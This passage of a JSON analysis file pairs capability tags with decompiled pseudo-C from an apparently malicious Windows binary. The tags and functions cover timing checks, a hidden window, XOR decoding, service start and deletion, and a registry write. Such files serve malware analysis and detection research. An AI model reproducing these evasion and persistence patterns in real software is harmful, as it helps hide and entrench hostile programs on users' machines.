&iStack60),  iVar4 < 0)) {\njoined_r0x00402201:\n                        if (piStack20 != NULL) {\n                            uStack8._0_1_ = 3;\n                            (**(*piStack20 + 8))(piStack20);\n                        }\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            (**(*param_1 + 8))(param_1);\n                        }\n                        goto code_r0x00402246;\n                    }\n                    if (iStack60 == 0) {\njoined_r0x0040203d:\n                        if (piStack20 != NULL) {\n                            uStack8._0_1_ = 3;\n                            (**(*piStack20 + 8))(piStack20);\n                        }\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            (**(*param_1 + 8))(param_1);\n                        }\n                    }\n                    else {\n                        fcn.00401bf0(iStack60, auStack592, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack60);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(auStack592, 0x40743c);\n                        if (iVar1 != 0) goto joined_r0x0040203d;\n                        piStack24 = NULL;\n                        uStack8._0_1_ = 5;\n                        iVar4 = (***param_1)(param_1, 0x4061a0, &piStack24);\n                        if ((iVar4 < 0) || (piStack24 == NULL)) {\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\njoined_r0x004021e6:\n                            if (piStack20 != NULL) {\n                                uStack8._0_1_ = 3;\n                                (**(*piStack20 + 8))(piStack20);\n                            }\n                            goto joined_r0x0040223a;\n                        }\n                        iVar4 = (**(*piStack24 + 0x20))(piStack24, &iStack64);\n                        iVar1 = iStack64;\n                        if (iVar4 < 0) {\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\n                            goto joined_r0x004021e6;\n                        }\n                        if (iStack64 == 0) {\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\n                            uStack8._0_1_ = 3;\n                            if (piStack20 != NULL) {\n                                (**(*piStack20 + 8))(piStack20);\n                            }\n                        }\n                        else {\n                            uStack332 = 0;\n                            puVar6 = &uStack331;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00401bf0(iVar1, &uStack332, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack64);\n                            iVar1 = fcn.00401d30(&uStack332);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*piStack20 + 0x114))(piStack20);\n                                uStack8._0_1_ = 4;\n                                if (piStack24 != NULL) {\n                                    (**(*piStack24 + 8))(piStack24);\n                                }\n                                goto joined_r0x00402201;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            uStack8._0_1_ = 4;\n                            if (piStack24 != NULL) {\n                                (**(*piStack24 + 8))(piStack24);\n                            }\n                            uStack8._0_1_ = 3;\n                            if (piStack20 != NULL) {\n                                (**(*piStack20 + 8))(piStack20);\n                            }\n                        }\n                        uStack8._0_1_ = 2;\n                        if (param_1 != NULL) {\n                            uStack8._0_1_ = 2;\n                            (**(*param_1 + 8))(param_1);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack56);\n                    iStack68 = iStack68 + 1;\n                } while (iStack68 < iStack32);\n            }\n            uStack8 = uStack8._1_3_ << 8;\n            if (piStack40 != NULL) {\n                (**(*piStack40 + 8))(piStack40);\n            }\n            uStack8 = 0xffffffff;\n            iVar1 = var_44h;\n            if (piStack36 != NULL) {\n                (**(*piStack36 + 8))(piStack36);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = uStack16;\n    return iVar4;\n}\n",
        "token_count": 2400
    },
    "00404090": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040d8) overlaps instruction at (ram,0x004040d7)\n// \n\nuint __cdecl fcn.00404090(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uint8_t *unaff_EBX;\n    bool in_CF;\n    \n    if ((!in_CF) && (in_CF)) {\n        unaff_EBX = unaff_EBX + in_CF + *(unaff_EBX + in_EDX * 4 + 0x69);\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = iVar2 + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 366
    },
    "00403410": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nuint __cdecl fcn.00403410(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x4114c0, 0x4244f8, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    bVar2 = iVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 201
    },
    "004039e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a13) overlaps instruction at (ram,0x00403a12)\n// \n\nvoid __thiscall fcn.004039e0(uint32_t param_1)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t *extraout_EDX;\n    char unaff_BL;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint8_t *unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint32_t in_stack_00000010;\n    \n    puVar3 = &stack0xfffffffc;\n    iVar4 = 0;\n    if (0 < in_stack_00000010) {\n        do {\n            if (in_stack_00000010 < param_1) {\ncode_r0x00403a13:\n                uVar2 = *(iVar4 + *(puVar3 + 0x10)) ^ *(iVar4 % *(puVar3 + 0xc) + *(puVar3 + 8));\n            }\n            else {\n                if (in_stack_00000010 >= param_1) goto code_r0x00403a13;\n                uVar2 = *(puVar3 + 0x10);\n                cVar1 = uVar2 - *unaff_EDI;\n                iVar4 = iVar4 + -1;\n                func_0x10189985((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                                (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 |\n                                (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI);\n                uVar2 = unaff_BL - 0x3a;\n                puVar3 = puVar3 + 1;\n                *extraout_EDX = *extraout_EDX | extraout_EDX >> 8;\n                unaff_EDI = unaff_EDI + 1;\n            }\n            in_stack_00000010 = *(puVar3 + 0x14);\n            param_1 = *(puVar3 + 0x10);\n            *(iVar4 + param_1) = in_stack_00000010 ^ uVar2;\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < in_stack_00000010);\n    }\n    return;\n}\n",
        "token_count": 605
    },
    "004026a0": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004026f5) overlaps instruction at (ram,0x004026f2)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004026a0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    uint64_t uVar4;\n    \n    uVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    iVar1 = uVar4;\n    if (iVar1 != 0) {\n        bVar3 = (uVar4 & 0x120000000000) == 0;\n        uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n        if ((bVar3) || (!bVar3)) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n        }\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 220
    },
    "00403190": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403190(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071e8, 0x40722c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    }
}